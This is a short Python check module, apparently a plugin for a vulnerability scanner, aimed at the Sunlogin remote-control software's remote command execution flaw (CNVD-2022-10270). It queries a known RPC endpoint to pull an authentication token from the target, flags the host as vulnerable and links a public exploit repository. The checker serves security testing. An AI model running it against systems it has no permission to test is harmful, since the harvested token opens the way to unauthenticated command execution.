import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': '向日葵 11.0.0.33162 远程命令执行(CNVD-2022-10270)',
        'vulnerable': False,
        'attack': True,
    }

    try:
        rep = requests.get(url, timeout=3)
        if re.search('Verification failure', rep.text):
            vurl = urllib.parse.urljoin(url, '/cgi-bin/rpc?action=verify-haras')
            rep2 = requests.get(vurl, timeout=3)
            cid = re.findall('"verify_string":"([^"]+)"', rep2.text)[0]
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['payload'] = vurl
            relsult['cid'] = cid
            relsult['about'] = 'https://github.com/Mr-xn/sunlogin_rce'
            return relsult
        else:
            return relsult
    except:
        return relsult

